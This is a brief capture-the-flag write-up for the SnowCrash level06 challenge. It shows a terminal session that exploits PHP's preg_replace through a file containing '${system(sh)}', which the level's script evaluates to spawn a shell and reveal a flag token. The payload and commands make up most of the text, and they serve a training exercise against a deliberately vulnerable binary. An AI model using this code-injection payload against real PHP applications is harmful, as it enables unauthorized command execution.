### Exploit

This level, we're going to look at the potential vunerabilities of a PHP script. More specifically, that of the function [preg_replace](http://www.madirish.net/402). 

```
  level06@SnowCrash:~$ echo '[x {$y}]' >/tmp/getflag
  level06@SnowCrash:~$ ./level06 /tmp/getflag flag06
  /tmp/getflag
  level06@SnowCrash:~$ echo '[x {${system(sh)}}]' >/tmp/getflag
  level06@SnowCrash:~$ ./level06 /tmp/getflag flag06
  PHP Notice:  Use of undefined constant sh - assumed 'sh' in /home/user/level06/level06.php(4) : regexp code on line 1
  getflag
  Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
```
